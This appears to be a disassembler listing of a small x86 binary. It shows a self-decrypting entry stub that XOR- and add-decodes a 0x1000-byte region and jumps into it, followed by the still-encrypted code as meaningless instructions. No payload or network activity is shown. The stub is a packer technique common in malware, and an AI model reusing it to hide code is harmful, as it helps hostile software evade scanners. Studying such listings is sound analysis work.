0x0051c000:	inl	$0x15, %eax	; from: 0x005cd045(MAY)
0x0051c002:	decl	%ecx
0x0051c003:	subb	$0xffffff8c, 0x21c244b4(%ebp)
0x0051c00a:	movl	0x4914ad82, %eax	; from: 0x0051c05b(MAY)
0x0051c00f:	cmpb	-1383970397(%eax), %dl
0x0051c015:	xchgl	%eax, %esp
0x0051c016:	jno	0x0051bfad	; targets: 0x0051c018(MAY), 0x0051bfad(MAY)
0x0051c018:	andb	%ah, %bl	; from: 0x0051c016(MAY)
0x0051c01a:	xchgl	%eax, %edi
0x0051c01c:	pushl	%eax
0x0051c01d:	cmpl	0x6f(%ebx), %edi
0x0051c020:	inl	%dx, %eax
0x0051c021:	movb	%al, 0x14aa8349
0x0051c022:	decl	%ecx	; from: 0x0051c063(MAY)
0x0051c023:	subl	$0x14, -1434302188(%edx)
0x0051c026:	decl	%ecx
0x0051c027:	subb	$0xc, 0x6d404914(%edx)
0x0051c02a:	decl	%ecx
0x0051c02b:	incl	%eax	; from: 0x0051c047(MAY)
0x0051c02c:	insl	%dx, %es:(%edi)
0x0051c02d:	orb	$0x4e, %al
0x0051c02e:	decl	%esi
0x0051c02f:	subb	$0x4, -1385623276(%ebp)
0x0051c036:	decl	%ecx
0x0051c037:	cmpb	$0x20, 0x17(%esi)
0x0051c03b:	movl	$0x81854523, -1041363165(%edx,%edi,4)
0x0051c046:	popl	%edi
0x0051c047:	jae	0x0051c02b	; targets: 0x0051c049(MAY), 0x0051c02b(MAY)
0x0051c049:	movsl	%ds:(%esi), %es:(%edi)	; from: 0x0051c047(MAY)
0x0051c04a:	jne	0x0051bfdb	; targets: 0x0051c04c(MAY), 0x0051bfdb(MAY)
0x0051c04c:	fstpl	-89(%eax)	; from: 0x0051c04a(MAY)
0x0051c04f:	decl	%esi
0x0051c050:	lodsl	%ds:(%esi), %eax
0x0051c051:	adcb	$0xffffffcc, %al
0x0051c053:	iret	; targets: 0x0051c054(MAY)

0x0051c054:	xorb	%ch, %bl	; from: 0x0051c053(MAY)
0x0051c056:	pushl	%edi
0x0051c057:	pushl	%ds
0x0051c058:	xchgl	%eax, %edx
0x0051c059:	leave	
0x0051c05a:	decl	%ecx
0x0051c05b:	jb	0x0051c00a	; targets: 0x0051c05d(MAY), 0x0051c00a(MAY)
0x0051c05d:	adcb	$0xffffffa4, %al	; from: 0x0051c05b(MAY)
0x0051c05f:	movsb	%ds:(%esi), %es:(%edi)
0x0051c060:	pushl	%ss
0x0051c061:	sbbb	$0xfffffff6, %al
0x0051c063:	jle	0x0051c022	; targets: 0x0051c022(MAY), 0x0051c065(MAY)
0x0051c065:	adcl	-113(%ecx), %ecx	; from: 0x0051c063(MAY)
0x0051c068:	rcrb	%cl, 0x6c(%edx)
0x0051c06b:	int3	

start:
0x005cd000:	subl	$0x4, %esp
0x005cd003:	pushl	%eax
0x005cd004:	pushl	%ebx
0x005cd005:	call	0x005cd00b	; targets: 0x005cd00b(MAY)
0x005cd00b:	popl	%eax	; from: 0x005cd005(MAY)
0x005cd00c:	movl	%eax, %ebx
0x005cd00e:	incl	%eax
0x005cd00f:	subl	$0xb1000, %eax
0x005cd014:	subl	$0x1009bd33, %eax
0x005cd019:	addl	$0x1009bd28, %eax
0x005cd01e:	cmpb	$0xffffffcc, (%ebx)
0x005cd021:	jne	0x005cd03c	; targets: 0x005cd023(MAY)
0x005cd023:	movb	$0x0, (%ebx)	; from: 0x005cd021(MAY)
0x005cd026:	movl	$0x1000, %ebx
0x005cd02b:	pushl	$0x8fc85a4
0x005cd030:	pushl	$0x754a6ef1
0x005cd035:	pushl	%ebx
0x005cd036:	pushl	%eax
0x005cd037:	call	0x005cd046	; targets: 0x005cd046(MAY)
0x005cd03c:	addl	$0x0, %eax	; from: 0x005cd06f(MAY)
0x005cd03f:	movl	%eax, 0x8(%esp)
0x005cd043:	popl	%ebx
0x005cd044:	popl	%eax
0x005cd045:	ret	; targets: 0x0051c000(MAY)

0x005cd046:	pushl	%ebp	; from: 0x005cd037(MAY)
0x005cd047:	movl	%esp, %ebp
0x005cd049:	pushl	%eax
0x005cd04a:	pushl	%ebx
0x005cd04b:	pushl	%ecx
0x005cd04c:	pushl	%esi
0x005cd04d:	movl	0x8(%ebp), %esi
0x005cd050:	movl	0xc(%ebp), %ecx
0x005cd053:	shrl	$0x2, %ecx
0x005cd056:	movl	0x10(%ebp), %eax
0x005cd059:	movl	0x14(%ebp), %ebx
0x005cd05c:	testl	%ecx, %ecx	; from: 0x005cd068(MAY)
0x005cd05e:	je	0x005cd06a	; targets: 0x005cd06a(MAY), 0x005cd060(MAY)
0x005cd060:	xorl	%eax, (%esi)	; from: 0x005cd05e(MAY)
0x005cd062:	addl	%ebx, (%esi)
0x005cd064:	addl	$0x4, %esi
0x005cd067:	decl	%ecx
0x005cd068:	jmp	0x005cd05c	; targets: 0x005cd05c(MAY)
0x005cd06a:	popl	%esi	; from: 0x005cd05e(MAY)
0x005cd06b:	popl	%ecx
0x005cd06c:	popl	%ebx
0x005cd06d:	popl	%eax
0x005cd06e:	leave	
0x005cd06f:	ret	$0x10	; targets: 0x005cd03c(MAY)

